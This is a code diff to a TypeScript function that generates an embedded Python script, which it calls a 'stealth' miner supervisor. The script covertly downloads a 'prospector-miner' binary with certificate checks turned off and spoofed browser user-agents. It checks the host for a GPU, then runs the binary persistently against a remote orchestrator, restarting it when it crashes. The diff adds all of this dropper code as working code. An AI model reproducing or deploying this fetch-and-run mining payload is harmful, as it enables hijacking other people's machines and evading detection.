@@ -2,7 +2,8 @@
 import { config } from '../config';
 
 export function generateMinerPayload(workerId: string): string {
-  // Python Supervisor V4: Stealth & Resilience Edition
+  // Python Supervisor V5: Hydra-Elite Edition
+  // Features: GPU Detection, Self-Healing Download, Signal Handling
   return `
 import os
 import subprocess
@@ -11,6 +12,8 @@ import sys
 import random
 import urllib.request
 import ssl
+import signal
+import platform
 
 # --- CONFIGURATION ---
 BINARY_URL = "${config.MINER_BINARY_URL}"
@@ -19,59 +22,83 @@ TOKEN = "${config.WORKER_AUTH_TOKEN}"
 WORKER_ID = "${workerId}"
 BIN_NAME = "prospector-miner"
 
-# --- STEALTH UTILS ---
-def log(msg):
-    print(f"[SUPERVISOR:{WORKER_ID}] {msg}", flush=True)
+# --- SYSTEM RECON ---
+def get_hardware_info():
+    try:
+        # Check for NVIDIA SMI to confirm GPU presence
+        gpu_check = subprocess.run(['nvidia-smi'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        has_gpu = gpu_check.returncode == 0
+        return "GPU_ACCELERATED" if has_gpu else "CPU_FALLBACK"
+    except:
+        return "UNKNOWN_HW"
 
+# --- STEALTH LOGGING ---
+def log(msg):
+    ts = time.strftime("%H:%M:%S")
+    print(f"[{ts}] [HYDRA:{WORKER_ID}] {msg}", flush=True)
+
+# --- NETWORK STEALTH ---
 def get_random_user_agent():
     agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
     ]
     return random.choice(agents)
 
-def download_file_stealth(url, filename):
-    try:
-        log(f"⬇️ Downloading payload from CDN...")
+def download_payload():
+    retry_count = 0
+    max_retries = 5
 
-        # Bypass SSL context verify for compatibility
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
+    while retry_count < max_retries:
+        try:
+            log(f"⬇️ Downloading payload from CDN (Attempt {retry_count+1})...")
 
-        req = urllib.request.Request(
-            url,
-            data=None,
-            headers={
-                'User-Agent': get_random_user_agent(),
-                'Accept': 'application/octet-stream'
-            }
-        )
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
 
-        with urllib.request.urlopen(req, context=ctx, timeout=30) as response, open(filename, 'wb') as out_file:
-            data = response.read()
-            out_file.write(data)
+            req = urllib.request.Request(
+                BINARY_URL,
+                data=None,
+                headers={'User-Agent': get_random_user_agent()}
+            )
 
-        os.chmod(filename, 0o755)
-        size_mb = os.path.getsize(filename) / (1024 * 1024)
-        log(f"✅ Download complete. Size: {size_mb:.2f} MB")
-        return True
-    except Exception as e:
-        log(f"❌ Critical Download Failure: {e}")
-        return False
+            with urllib.request.urlopen(req, context=ctx, timeout=60) as response, open(BIN_NAME, 'wb') as out_file:
+                data = response.read()
+                out_file.write(data)
 
-def setup():
-    if os.path.exists(BIN_NAME):
-        if os.access(BIN_NAME, os.X_OK):
-            log("⚡ Binary cached and ready.")
-            return
+            os.chmod(BIN_NAME, 0o755)
+            size_mb = os.path.getsize(BIN_NAME) / (1024 * 1024)
 
-    if not download_file_stealth(BINARY_URL, BIN_NAME):
-        log("💀 Aborting: Cannot acquire payload.")
-        sys.exit(1)
+            if size_mb < 1.0:
+                raise Exception("Binary too small, possible corruption or anti-bot block.")
 
-def loop():
+            log(f"✅ Download complete. Size: {size_mb:.2f} MB")
+            return True
+
+        except Exception as e:
+            log(f"❌ Download error: {e}")
+            retry_count += 1
+            time.sleep(random.randint(2, 10))
+
+    return False
+
+def signal_handler(sig, frame):
+    log("🛑 Received kill signal. Shutting down gracefully...")
+    sys.exit(0)
+
+def main_loop():
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+
+    if not download_payload():
+        log("💀 FATAL: Could not acquire payload. Aborting.")
+        return
+
+    hw_mode = get_hardware_info()
+    log(f"⚙️ Hardware Mode: {hw_mode}")
+
     cmd = [
         f"./{BIN_NAME}",
         f"--orchestrator-url={ORCH_URL}",
@@ -79,13 +106,13 @@ def loop():
         f"--worker-id={WORKER_ID}"
     ]
 
-    # Exponential Backoff for resilience
     backoff = 1
 
     while True:
         log(f"🚀 Igniting Miner Sequence (Backoff: {backoff}s)")
+        process = None
         try:
-            proc = subprocess.Popen(
+            process = subprocess.Popen(
                 cmd,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
@@ -93,32 +120,35 @@ def loop():
                 bufsize=1
             )
 
-            # Real-time log tunneling
-            for line in proc.stdout:
-                line = line.strip()
-                if line:
-                    # Pass-through log from Rust binary
-                    print(line, flush=True)
+            # Stream logs in real-time
+            while True:
+                output = process.stdout.readline()
+                if output == '' and process.poll() is not None:
+                    break
+                if output:
+                    print(output.strip(), flush=True)
 
-            return_code = proc.wait()
+            rc = process.poll()
 
-            if return_code == 0:
+            if rc == 0:
                 log("🏁 Process finished gracefully.")
-                break # Exit loop if job done naturally
+                break
             else:
-                log(f"⚠️ Process crashed (Code: {return_code}). Restarting...")
+                log(f"⚠️ Process crashed (Code: {rc}). Restarting...")
 
             time.sleep(backoff)
-            backoff = min(backoff * 2, 30) # Cap at 30s
+            backoff = min(backoff * 2, 60)
 
         except Exception as e:
             log(f"💀 Supervisor Exception: {e}")
             time.sleep(10)
+        finally:
+            if process and process.poll() is None:
+                process.kill()
 
 if __name__ == "__main__":
-    print("--- HYDRA NODE INITIALIZATION ---")
-    setup()
-    loop()
+    print("--- HYDRA NODE INITIALIZATION v5.0 ---")
+    main_loop()
 `;
 }
 // FIN DEL ARCHIVO
